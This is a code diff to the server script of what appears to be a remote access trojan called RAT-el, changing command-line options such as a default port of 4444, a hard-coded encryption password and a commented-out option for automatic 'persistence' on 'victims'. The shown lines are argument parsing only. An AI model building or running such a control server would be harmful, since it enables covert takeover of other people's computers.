@@ -27,12 +27,13 @@ printColor("successfully",myBanner())
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-i","--ip", dest="IP", default="", help="the ip address of the server.")
-parser.add_argument("-p","--port", dest="PORT", required=True, help="the port number of the server.")
-parser.add_argument("-d","--display", action="store_false", default=True, help="disables the display of client information (Logoff and incoming connection).")
+parser.add_argument("-p","--port", dest="PORT",default=4444, help="the port number of the server.")
 parser.add_argument("-t","--time", dest="TIME", default=60, help="the number of seconds of automatic message sending to check if the connection is alive or dead.")
 #parser.add_argument("-a","--auto", action="store_true", default=False,help="if the -a or --auto parameter is added then all victims will perform persistence automatically.")
-parser.add_argument("-c","--clean", dest="CLEAN", action="store_true", default=False, help="cleans all the data in the database.")
 parser.add_argument("-pa", "--password", dest="PASSWORD", default="CISCOTHEBOSS", help="The password to generate the key to encrypt and decrypt the data. The default password is 'CISCOTHEBOSS'.")
+parser.add_argument("-c","--clean", dest="CLEAN", action="store_true", default=False, help="cleans all the data in the database.")
+parser.add_argument("-d","--display", action="store_false", default=True, help="disables the display of client information (Logoff and incoming connection).")
+
 
 try:
     argv = vars(parser.parse_args())
@@ -45,9 +46,9 @@ try:
     PASSWORD = str(argv["PASSWORD"])
 
 except SystemExit:
-    print("example: /usr/bin/python3 server.py -p 8888" )
+    print("Basic example: /usr/bin/python3 server.py -p 4444" )
     exit(0)
-else:
+else:  
     #print("[+] Server started.\n")
     if(CLEAN):
         try:
@@ -55,7 +56,6 @@ else:
         except Exception as e:
             print(e)
             
-        
     SqlObj = Sql("sql/RAT-el.sqlite3", "sql/table_ratel.sql", "table_ratel")
 
     handler= Handler(HOST,PORT,DISPLAY,SqlObj,PASSWORD) 
